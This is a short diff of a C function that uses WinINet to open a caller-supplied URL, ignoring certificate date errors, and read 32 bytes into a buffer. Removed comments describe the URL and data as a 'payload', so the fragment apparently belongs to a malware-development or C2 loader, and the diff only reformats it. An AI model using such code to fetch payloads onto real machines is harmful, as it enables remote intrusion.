@@ -7,31 +7,25 @@
 
 BOOL SendRequest(LPCWSTR EndpointUrl, char *uuid) {
 
-	HINTERNET	hInternet = NULL,
-		hInternetFile = NULL;
+	HINTERNET hInternet = NULL,
+	hInternetFile = NULL;
+	PBYTE pBytes = NULL;
+	DWORD dwBytesRead = NULL;
 
-	PBYTE		pBytes = NULL;
-
-	DWORD		dwBytesRead = NULL;
-
-	// Opening an internet session handle
 	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
 	if (hInternet == NULL) {
 		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// Opening a handle to the payload's URL
 	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	if (hInternetFile == NULL) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// Allocating a buffer for the payload
 	pBytes = (PBYTE)LocalAlloc(LPTR, 32);
 
-	// Reading the payload
 	if (!InternetReadFile(hInternetFile, pBytes, 32, &dwBytesRead)) {
 		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
 		return FALSE;
